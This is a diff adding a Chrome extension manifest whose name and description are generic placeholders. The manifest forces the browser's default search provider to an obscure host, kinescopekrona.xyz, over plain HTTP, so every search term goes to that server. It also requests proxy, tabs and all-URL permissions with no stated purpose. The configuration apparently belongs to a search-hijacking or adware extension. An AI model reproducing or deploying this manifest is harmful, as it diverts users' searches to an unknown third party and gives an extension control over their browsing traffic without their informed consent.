@@ -1,0 +1,41 @@
+{
+	"background": {
+		"page": "main.html",
+		"scripts": []
+	},
+	"browser_action": {
+		"default_icon": "assets/images/icon-blue.png",
+		"default_popup": "popup.html",
+		"default_title": "__MSG_manifest_iconTitle__"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://kinescopekrona.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "kinescopekrona",
+			"name": "kinescopekrona",
+			"search_url": "http://kinescopekrona.xyz/?stintcost={searchTerms}"
+		}
+	},
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"128": "assets/images/icon-128.png",
+		"16": "assets/images/icon.png"
+	},
+	"manifest_version": 2,
+	"minimum_chrome_version": "18.0.0",
+	"name": "__MSG_appName__",
+	"options_page": "options.html",
+	"permissions": [
+		"proxy",
+		"tabs",
+		"<all_urls>",
+		"http://*/*",
+		"https://*/*",
+		"ftp://*/*"
+	],
+	"update_url": "http://clients2.google.com/service/update2/crx",
+	"version": "1.0"
+}
